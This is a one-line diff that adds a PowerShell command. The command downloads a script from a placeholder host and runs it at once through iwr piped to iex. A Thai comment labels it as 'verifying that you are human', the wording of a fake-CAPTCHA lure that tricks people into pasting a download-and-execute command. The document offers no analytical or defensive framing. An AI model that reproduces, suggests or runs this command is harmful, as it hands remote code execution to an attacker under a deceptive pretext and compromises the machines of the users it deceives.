@@ -1,0 +1,1 @@
+powershell -NoProfile -Command "iwr https://example.invalid/c|iex" # กำลังตรวจสอบว่าคุณเป็นมนุษย์
